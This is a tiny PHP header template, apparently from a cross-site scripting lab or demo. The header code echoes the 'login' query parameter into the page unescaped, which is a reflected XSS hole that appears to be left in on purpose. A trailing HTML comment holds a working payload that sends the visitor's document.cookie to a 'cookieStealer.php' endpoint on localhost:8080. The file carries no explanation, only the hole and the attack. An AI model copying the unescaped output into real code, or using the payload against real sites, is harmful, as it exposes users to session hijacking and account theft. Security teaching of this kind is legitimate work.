<?php
echo '<div class="header">
        <div class="header--logo">|Alpha|</div>
		<p class="header--font">'.(isset($_GET['login']) ? $_GET['login'] : $_SESSION['login']).'</p>
        <i class="ion-ios-cog icon-big"></i>
    </div>';
?>

<!-- '<script>location.assign("http://localhost:8080/cookieStealer.php?"+document.cookie)</script>' -->
